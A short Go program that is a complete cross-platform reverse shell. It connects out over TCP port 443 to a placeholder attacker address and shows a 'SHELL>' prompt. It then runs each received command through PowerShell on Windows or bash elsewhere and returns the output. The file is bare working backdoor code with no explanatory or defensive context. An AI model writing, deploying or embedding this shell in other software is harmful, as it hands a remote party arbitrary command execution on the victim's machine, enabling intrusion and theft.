// Windows (Linux/macOS).
package main

import (
    "fmt"
    "net"
    "os/exec"
    "runtime"
    "strings"
)

func main() {
    host := "IP_ADDRESS"
    port := 443

    conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
    if err != nil {
        fmt.Printf("Connection refused to %s:%d\n", host, port)
        return
    }
    defer conn.Close()

    conn.Write([]byte("SHELL> "))

    for {
        buf := make([]byte, 4096)
        n, err := conn.Read(buf)
        if err != nil {
            break
        }

        command := strings.TrimSuffix(string(buf[:n]), "\n")
        if command == "exit" {
            break
        }

        var output string
        if runtime.GOOS == "windows" {
            cmd := exec.Command("powershell", "-Command", command)
            result, err := cmd.CombinedOutput()
            if err != nil {
                output = fmt.Sprintf("Error executing command: %s\n", err)
            } else {
                output = string(result)
            }
        } else {
            cmd := exec.Command("bash", "-c", command)
            result, err := cmd.CombinedOutput()
            if err != nil {
                output = fmt.Sprintf("Error executing command: %s\n", err)
            } else {
                output = string(result)
            }
        }

        response := output + "SHELL> "
        conn.Write([]byte(response))
    }
}
